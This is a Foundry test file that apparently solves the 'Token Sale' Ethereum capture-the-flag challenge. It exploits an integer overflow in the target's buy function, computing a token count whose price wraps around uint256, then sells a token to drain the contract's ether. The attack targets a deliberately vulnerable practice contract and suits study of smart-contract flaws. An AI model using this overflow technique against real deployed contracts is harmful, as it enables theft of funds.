// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;
import "forge-std/Test.sol";
import "../../src/math/1.sol";
import "forge-std/console.sol";
contract TokenSaleChallengeTest is Test {
    TokenSaleChallenge target;
    address player;
    function setUp() public {
        target = new TokenSaleChallenge{value:1 ether}(player);
        player = vm.addr(1);
        vm.deal(player, 100 ether);
        vm.label(player, "player");
    }

    function testComplete() public {
        vm.startPrank(player);
        uint256 numTokens = type(uint256).max / 1e18 + 1;
        
        target.buy{value: numTokens * 1e18}(numTokens);
        emit log_named_uint("tokens", (numTokens * 1e18) - type(uint256).max );
        target.sell(1);
        uint256 balance = address(target).balance;
        emit log_named_uint("balance", balance / 1e18);
        assertTrue(target.isComplete());
    }
}